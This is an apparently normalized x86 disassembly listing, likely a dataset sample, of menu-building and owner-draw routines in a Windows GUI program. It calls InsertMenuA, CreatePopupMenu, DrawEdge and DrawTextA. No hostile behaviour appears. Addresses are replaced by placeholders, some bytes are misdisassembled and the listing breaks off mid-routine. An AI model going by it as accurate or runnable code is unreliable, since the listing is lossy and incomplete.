je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_4212ec
mov [ ebx + 0x3e ] 0x1
mov [ ebx + 0x39 ] 0x1
mov [ ebx + 0x3b ] 0x2
mov [ ebx + 0x3c ] 0x2
call sub_465668
mov [ ebx + 0x50 ] ax
mov [ ebx + 0x40 ] 0xffffffff
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031bc
mov esi eax
mov [ ebx + 0x78 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_46858c
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403550
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4035a8
pop [ fs : 0x0 ]
add esp 0xc
sub_465bf8
push ebx
push esi
call sub_4035b8
mov ebx edx
mov esi eax
mov edx esi
mov eax [ rw-data ]
call sub_46a5d0
mov eax [ esi + 0x64 ]
test eax eax
je r-xdata
mov eax esi
call sub_467c28
test eax eax
jg r-xdata
mov edx esi
call sub_467fc0
xor eax eax
mov [ esi + 0x64 ] eax
jmp r-xdata
xor edx edx
mov eax esi
call sub_467c38
call sub_4031ec
cmp [ esi + 0x34 ] 0x0
je r-xdata
mov eax [ esi + 0x5c ]
call sub_4031ec
lea eax [ esi + 0x44 ]
call sub_40d538
lea eax [ esi + 0x78 ]
call sub_40d538
mov ax [ esi + 0x50 ]
test ax ax
je r-xdata
xor edx edx
mov eax esi
call sub_466014
mov eax [ esi + 0x34 ]
push eax
call DestroyMenu
mov eax [ esi + 0x4c ]
test eax eax
je r-xdata
movzx edx ax
xor ecx ecx
mov eax [ rw-data ]
call sub_4192f0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_421338
test bl bl
jle r-xdata
call sub_4031ec
pop esi
pop ebx
retn
mov eax esi
call sub_4035a0
sub_465cac
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x40 ] ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x1 ] cl
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_465f07
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x3e ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_465f0e
lea eax [ ebp - 0x40 ]
call sub_403f7c
lea eax [ ebp - 0x8 ]
call sub_403f7c
retn
lea eax [ ebp - 0x8 ]
mov edx [ ebx + 0x30 ]
call sub_404014
mov eax ebx
call sub_467c28
test eax eax
jle r-xdata
cmp [ ebx + 0x60 ] 0x0
je r-xdata
mov eax ebx
call sub_4661bc
mov [ ebp - 0x25 ] eax
jmp r-xdata
call GetVersion
and eax 0xff
cmp ax 0x4
jb r-xdata
mov esi [ ebx + 0x64 ]
test esi esi
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx r-xdata
call sub_404388
sete al
and eax 0x7f
mov esi [ eax * 4 + rw-data ]
xor eax eax
mov al [ ebx + 0x48 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x38 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x39 ]
or eax [ edx * 4 + rw-data ]
or esi eax
or esi 0x400
mov eax ebx
call sub_467c28
test eax eax
jle r-xdata
mov [ ebp - 0x39 ] 0x2c
mov [ ebp - 0x35 ] 0x3f
mov eax ebx
call sub_4681e4
mov esi eax
test esi esi
je r-xdata
push [ ebp - 0x8 ]
push r-xdata
lea edx [ ebp - 0x40 ]
mov ax [ ebx + 0x60 ]
call sub_465310
push [ ebp - 0x40 ]
lea eax [ ebp - 0x8 ]
mov edx 0x3
call sub_4042fc
cmp [ esi + 0x64 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
call sub_40443c
push eax
movzx eax [ ebx + 0x50 ]
push eax
push esi
push 0xffffffff
push edi
call InsertMenuA
mov eax [ ebx + 0x30 ]
call sub_40443c
push eax
mov eax ebx
call sub_4661bc
push eax
or esi 0x10
push esi
push 0xffffffff
push edi
call InsertMenuA
jmp r-xdata
cmp [ ebx + 0x4c ] 0x0
je r-xdata
cmp [ esi + 0x40 ] 0x0
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx [ r-xdata ]
call sub_403378
test al al
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx + 0x4c ]
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
je r-xdata
mov al 0x1
mov eax ebx
call sub_467800
test eax eax
jne r-xdata
mov [ ebp - 0x9 ] al
mov eax [ ebx + 0x30 ]
mov edx r-xdata
call sub_404388
sete al
and eax 0x7f
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x3d ]
mov edx [ edx * 4 + rw-data ]
xor ecx ecx
mov cl [ ebx + 0x48 ]
or edx [ ecx * 4 + rw-data ]
or eax edx
xor edx edx
mov dl [ ebp - 0x1 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebp - 0x9 ]
or eax [ edx * 4 + rw-data ]
mov [ ebp - 0x31 ] eax
xor eax eax
mov al [ ebx + 0x38 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x39 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x3a ]
or eax [ edx * 4 + rw-data ]
mov [ ebp - 0x2d ] eax
movzx eax [ ebx + 0x50 ]
mov [ ebp - 0x29 ] eax
xor eax eax
mov [ ebp - 0x25 ] eax
xor eax eax
mov [ ebp - 0x21 ] eax
xor eax eax
mov [ ebp - 0x1d ] eax
mov eax [ ebp - 0x8 ]
call sub_40443c
mov [ ebp - 0x15 ] eax
mov eax ebx
call sub_467c28
test eax eax
jle r-xdata
lea eax [ ebp - 0x39 ]
push eax
push 0xffffffff
push 0xffffffff
push edi
call InsertMenuItemA
jmp r-xdata
mov eax ebx
call sub_4661bc
mov [ ebp - 0x25 ] eax
sub_465f27
inc [ ecx ]
add [ eax ] al
add [ 0x55000000 ] ch
mov ebp esp
mov edx [ ebp + 0x8 ]
mov cl [ edx - 0x5 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x34 ]
call sub_465cac
xor eax eax
pop ebp
retn
sub_465f4c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x70 ]
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x70 ]
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_469820
test al al
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_4687e8
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_468ce4
mov [ ebp - 0x5 ] al
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x68 ]
mov eax r-xdata
mov ecx [ ebp - 0x4 ]
call sub_4656e8
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov al 0x1
sub_465fbc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_466006
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_41e290
mov eax [ ebp - 0x4 ]
call sub_465570
mov edx eax
mov eax ebx
call sub_467c5c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46600d
lea eax [ ebp - 0x4 ]
call sub_403f7c
retn
sub_466014
push ebx
mov ebx eax
test edx edx
je r-xdata
mov eax [ ebx + 0x68 ]
cmp edx eax
je r-xdata
test [ edx + 0x1c ] 0x8
jne r-xdata
pop ebx
retn
test eax eax
je r-xdata
mov eax edx
mov [ ebx + 0x68 ] eax
test eax eax
je r-xdata
xor ecx ecx
mov [ eax + 0x6c ] ecx
mov eax ebx
call sub_46608c
mov [ eax + 0x6c ] ebx
mov edx ebx
call sub_4213bc
sub_466050
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_42173c
mov eax ebx
call sub_467c10
test eax eax
je r-xdata
cmp [ ebx + 0x74 ] 0x0
je r-xdata
mov eax ebx
call sub_467c10
mov edx eax
mov cl 0x1
mov eax ebx
mov si 0xffef
call sub_4033e8
pop esi
pop ebx
retn
mov eax ebx
call sub_46608c
sub_46608c
push ebx
push esi
push edi
push ebp
mov ebp eax
test [ ebp + 0x1c ] 0x8
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
test [ ebp + 0x1c ] 0x2
je r-xdata
mov eax [ ebp + 0x6c ]
test eax eax
je r-xdata
mov [ ebp + 0x74 ] 0x1
jmp r-xdata
mov eax ebp
call sub_4661bc
push eax
call GetMenuItemCount
mov esi eax
test esi esi
sete bl
test esi esi
jle r-xdata
call sub_46608c
jmp r-xdata
test bl bl
je r-xdata
push 0x400
mov edi esi
dec edi
push edi
mov eax ebp
call sub_4661bc
push eax
call GetMenuState
test al 0x4
jne r-xdata
cmp [ ebp + 0x64 ] 0x0
jne r-xdata
dec esi
test esi esi
jg r-xdata
push 0x400
push edi
mov eax ebp
call sub_4661bc
push eax
call RemoveMenu
mov bl 0x1
mov eax ebp
call sub_465f4c
mov eax [ ebp + 0x70 ]
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
mov eax ebp
call sub_4661bc
push eax
call GetMenuItemCount
test eax eax
jne r-xdata
mov eax [ ebp + 0x34 ]
push eax
call DestroyMenu
xor eax eax
mov [ ebp + 0x34 ] eax
jmp r-xdata
xor edx edx
mov eax ebp
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_46615c
push ebx
push esi
push edi
push ebp
push ecx
mov ebx ecx
mov [ esp ] edx
mov edi eax
mov eax edi
call sub_467c28
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebp ebp
mov edx ebp
mov eax edi
call sub_467c38
cmp bl [ eax + 0x3f ]
jbe r-xdata
mov edx ebp
mov eax edi
call sub_467c38
cmp bl [ eax + 0x3f ]
jae r-xdata
inc ebp
dec esi
jne r-xdata
mov edx ebp
mov eax edi
call sub_467c38
mov [ eax + 0x3f ] bl
mov eax [ rw-data ]
call sub_465264
jmp r-xdata
cmp ebp [ esp ]
jge r-xdata
sub_4661bc
push ebx
mov ebx eax
cmp [ ebx + 0x34 ] 0x0
jne r-xdata
mov eax [ ebx + 0x34 ]
pop ebx
retn
mov eax [ ebx + 0x4 ]
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
call CreateMenu
mov [ ebx + 0x34 ] eax
call CreatePopupMenu
mov [ ebx + 0x34 ] eax
jmp r-xdata
mov eax ebx
call sub_465f4c
mov eax [ rw-data ]
call sub_465264
cmp [ ebx + 0x34 ] 0x0
jne r-xdata
sub_466208
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_421664
push ebx
push sub_465fbc
push 0x0
push 0x0
xor ecx ecx
mov edx r-xdata
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop esi
pop ebx
retn
sub_46624c
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov ebx [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_466430
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_4681e4
mov edi eax
test edi edi
je r-xdata
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
call sub_404014
test bh 0x4
je r-xdata
mov eax edi
call sub_469820
test al al
je r-xdata
mov eax [ ebp - 0xc ]
mov edx r-xdata
call sub_404388
jne r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
test bl 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov dl 0x1
call sub_425090
cmp [ esi + 0x3a ] 0x0
je r-xdata
test bh 0x4
jne r-xdata
lea eax [ ebp - 0xc ]
mov edx r-xdata
call sub_404244
mov eax [ ebp - 0xc ]
cmp [ eax ] 0x26
jne r-xdata
mov eax ebx
and eax 0x2
cmp eax 0x2
jne r-xdata
and ebx 0xffffffff
or ebx 0x2
jmp r-xdata
cmp [ esi + 0x39 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edi [ eax + 0xc ]
mov eax edi
call sub_424a68
mov edx eax
or dl [ r-xdata ]
mov eax edi
call sub_424a74
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_466437
lea eax [ ebp - 0xc ]
call sub_403f7c
retn
mov eax [ ebp + 0x10 ]
mov esi eax
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
add [ ebp - 0x18 ] 0x4
push 0x2
push 0x6
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_425738
push eax
call DrawEdge
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x1 ] 0x0
jne r-xdata
or ebx 0x20000
and ebx 0xfffffffd
or ebx 0x0
push ebx
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp - 0xc ]
call sub_40423c
push eax
mov eax [ ebp - 0xc ]
call sub_40443c
push eax
mov eax [ ebp - 0x4 ]
call sub_425738
push eax
call DrawTextA
cmp [ ebp + 0xc ] 0x0
jne r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
push 0x1
push 0x1
mov eax [ ebp + 0x10 ]
push eax
call OffsetRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov edx 0xff000014
call sub_4247a8
push ebx
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp - 0xc ]
call sub_40423c
push eax
mov eax [ ebp - 0xc ]
call sub_40443c
push eax
mov eax [ ebp - 0x4 ]
call sub_425738
push eax
call DrawTextA
push 0xffffffff
push 0xffffffff
mov eax [ ebp + 0x10 ]
push eax
call OffsetRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov edx 0xff000010
call sub_4247a8
mov eax 0xff00000d
call sub_4242e8
mov esi eax
mov eax 0xff000010
call sub_4242e8
cmp esi eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov edx 0xff000014
call sub_4247a8
jmp r-xdata
sub_46649c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_466d84
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_425318
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001d
call sub_424f74
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov edx 0xff00000e
call sub_4247a8
jmp r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x30 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov al [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x31 ] al
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x20 ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x30 ]
mov edx r-xdata
call sub_404388
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001e
call sub_424f74
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x40 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_425318
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax - 0x10 ] edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0x8 ] 0xfffffffc
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x0
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
add [ eax - 0x8 ] 0x2
mov eax [ ebp + 0x8 ]
add [ eax - 0x4 ] 0x2
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx - 0x41 ] al
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_463038
cmp ebx eax
jl r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x4c ]
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov esi [ eax + 0x4c ]
test esi esi
je r-xdata
mov al 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
push 0xf
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
movzx eax [ eax + 0x38 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xfffffff0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_425738
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
add eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
add eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x40 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x10 ]
lea edi [ edx - 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
inc [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_424f6c
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000d
call sub_424f74
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
sub edx eax
sar edx 0x1
jns r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_429e14
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4c ] eax
xor eax eax
push ebp
push sub_4668e3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
push 0x7ff8
push 0x0
call LoadBitmapA
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
call sub_42af5c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov edx 0xff000012
call sub_4247a8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov esi [ ecx - 0xc ]
sub edx esi
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_463038
cmp ebx eax
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000f
call sub_424f74
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_425318
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_424f6c
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov edx 0xff000014
mov eax 0xff00000f
call sub_42c058
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_424f48
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_425318
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x0
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x20 ]
lea edi [ edx - 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x20
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xd ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
add [ eax - 0x20 ] 0x2
mov eax [ ebp + 0x8 ]
dec [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x31 ]
mov ax [ eax * 2 + rw-data ]
or ax 0x60
movzx eax ax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x64 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x65 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_425318
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_425460
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x5c ]
lea edi [ edx - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
add edx [ eax - 0x10 ]
inc edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
add eax [ edx - 0x10 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx esi
inc edx
